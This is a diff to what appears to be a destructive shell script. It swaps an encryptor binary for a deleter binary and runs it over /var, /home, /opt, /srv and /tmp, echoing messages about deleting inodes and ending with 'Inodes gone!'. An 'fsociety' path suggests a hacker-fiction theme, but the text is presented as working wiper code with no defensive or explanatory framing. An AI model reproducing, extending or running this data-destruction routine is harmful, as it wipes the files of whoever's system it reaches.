@@ -18,15 +18,15 @@ echo "[*] Delete inodes in /var..."
 "$DELETER_BIN" /var /fsociety
 
 echo "[*] Delete inodes in /home..."
-"$ENCRYPTOR_BIN" /home /fsociety
+"$DELETER_BIN" /home /fsociety
 
 echo "[*] Delete inodes in /opt..."
-"$ENCRYPTOR_BIN" /opt /fsociety
+"$DELETER_BIN" /opt /fsociety
 
 echo "[*] Delete inodes in /srv..."
-"$ENCRYPTOR_BIN" /srv /fsociety
+"$DELETER_BIN" /srv /fsociety
 
 echo "[*] Delete inodes in /tmp..."
-"$ENCRYPTOR_BIN" /tmp /fsociety
+"$DELETER_BIN" /tmp /fsociety
 
 echo "[+] Inodes gone!"
